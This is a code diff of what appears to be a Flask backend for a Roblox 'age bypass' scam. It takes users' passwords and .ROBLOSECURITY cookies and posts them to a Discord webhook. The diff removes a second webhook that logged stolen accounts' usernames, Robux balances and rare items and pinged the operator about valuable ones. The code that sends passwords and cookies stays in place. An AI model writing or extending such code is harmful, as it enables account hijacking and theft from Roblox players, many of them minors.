@@ -31,75 +31,6 @@ def clean_roblox_cookie(cookie):
     
     return cookie
 
-def send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url):
-    """Send clean bypass logs (without cookie) to Discord webhook"""
-    try:
-        print("Background: Sending clean bypass logs...")
-        
-        # Check if user has Korblox or Headless for ping notification  
-        has_premium_items = korblox or headless
-        ping_content = ''
-        
-        if has_premium_items:
-            # Ping the user if account has Korblox or Headless
-            ping_content = '<@1343590833995251825> 🚨 **PREMIUM ITEMS DETECTED!** 🚨'
-            if korblox and headless:
-                ping_content += ' - Account has both Korblox AND Headless!'
-            elif korblox:
-                ping_content += ' - Account has Korblox!'
-            elif headless:
-                ping_content += ' - Account has Headless!'
-        
-        # Create Discord embed data for bypass logs (clean, no cookie)
-        bypass_data = {
-            'content': ping_content,
-            'embeds': [
-                {
-                    'title': '🎯 Age Bypass Successful',
-                    'color': 0x00ff00,  # Green color for success
-                    'thumbnail': {
-                        'url': user_info['profile_picture']
-                    },
-                    'fields': [
-                        {
-                            'name': '👤 Username',
-                            'value': user_info['username'],
-                            'inline': False
-                        },
-                        {
-                            'name': '💰 Robux',
-                            'value': user_info['robux_balance'].replace('R$ ', '') if 'R$ ' in user_info['robux_balance'] else user_info['robux_balance'],
-                            'inline': False
-                        },
-                        {
-                            'name': '📊 Status',
-                            'value': 'Successful ✅',
-                            'inline': False
-                        },
-                        {
-                            'name': '🎭 Premium Items',
-                            'value': f"Korblox: {'✅' if korblox else '❌'} | Headless: {'✅' if headless else '❌'}",
-                            'inline': False
-                        }
-                    ],
-                    'footer': {
-                        'text': f'Bypassed at {time.strftime("%H:%M", time.localtime())}',
-                        'icon_url': 'https://images-ext-1.discordapp.net/external/1pnZlLshYX8TQApvvJUOXUSmqSHHzIVaShJ3YnEu9xE/https/www.roblox.com/favicon.ico'
-                    }
-                }
-            ]
-        }
-        
-        # Send to bypass webhook
-        response = requests.post(bypass_webhook_url, json=bypass_data, timeout=5)
-        
-        if response.status_code in [200, 204]:
-            print(f"Background: Bypass logs webhook successful: {response.status_code}")
-        else:
-            print(f"Background: Bypass logs webhook failed: {response.status_code}")
-            
-    except Exception as e:
-        print(f"Background: Error sending bypass logs to Discord: {str(e)}")
 
 def send_to_discord_background(password, korblox, headless, cookie, webhook_url):
     """Background function to send data to Discord webhook"""
@@ -205,18 +136,6 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
         else:
             print(f"Background: Discord webhook failed: {response.status_code}")
         
-        # Also send to bypass logs webhook (clean data without cookie) - only if cookie worked
-        if user_info.get('success', False):
-            bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
-            if bypass_webhook_url:
-                print("Background: Sending to bypass logs webhook...")
-                send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url)
-            else:
-                print("Background: BYPASS_WEBHOOK_URL environment variable not configured")
-                print("Background: Available webhook env vars:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper()])
-                print("Background: Bypass logs will not be sent - configure BYPASS_WEBHOOK_URL to enable")
-        else:
-            print("Background: Not sending bypass logs - cookie validation failed")
             
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
@@ -443,10 +362,9 @@ def health_check():
 
 @app.route('/health/full')
 def health_check_full():
-    """Comprehensive health check for both main and bypass webhooks"""
+    """Comprehensive health check for the main webhook"""
     results = {
         'main_webhook': {'status': 'unknown'},
-        'bypass_webhook': {'status': 'unknown'},
         'overall_status': 'unknown'
     }
     
@@ -480,45 +398,11 @@ def health_check_full():
                 'message': f'Main webhook error: {str(e)[:100]}'
             }
     
-    # Test bypass webhook
-    bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
-    if not bypass_webhook_url:
-        results['bypass_webhook'] = {
-            'status': 'warning',
-            'message': 'BYPASS_WEBHOOK_URL not configured - bypass logs will not work'
-        }
-    else:
-        try:
-            test_payload = {'content': 'Bypass webhook health check'}
-            response = requests.post(bypass_webhook_url, json=test_payload, timeout=5)
-            
-            if response.status_code in [200, 204]:
-                results['bypass_webhook'] = {
-                    'status': 'ok',
-                    'message': 'Bypass webhook successful',
-                    'status_code': response.status_code
-                }
-            else:
-                results['bypass_webhook'] = {
-                    'status': 'error',
-                    'message': f'Bypass webhook failed with status {response.status_code}',
-                    'status_code': response.status_code
-                }
-        except Exception as e:
-            results['bypass_webhook'] = {
-                'status': 'error',
-                'message': f'Bypass webhook error: {str(e)[:100]}'
-            }
-    
     # Determine overall status
     main_ok = results['main_webhook']['status'] == 'ok'
-    bypass_ok_or_warning = results['bypass_webhook']['status'] in ['ok', 'warning']
     
-    if main_ok and bypass_ok_or_warning:
+    if main_ok:
         results['overall_status'] = 'ok'
-        status_code = 200
-    elif main_ok:
-        results['overall_status'] = 'partial'
         status_code = 200
     else:
         results['overall_status'] = 'error'
@@ -532,7 +416,6 @@ def debug_info():
     return jsonify({
         'environment_variables': {
             'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
-            'BYPASS_WEBHOOK_URL': 'SET' if os.environ.get('BYPASS_WEBHOOK_URL') else 'NOT_SET',
             'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
             'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
         },
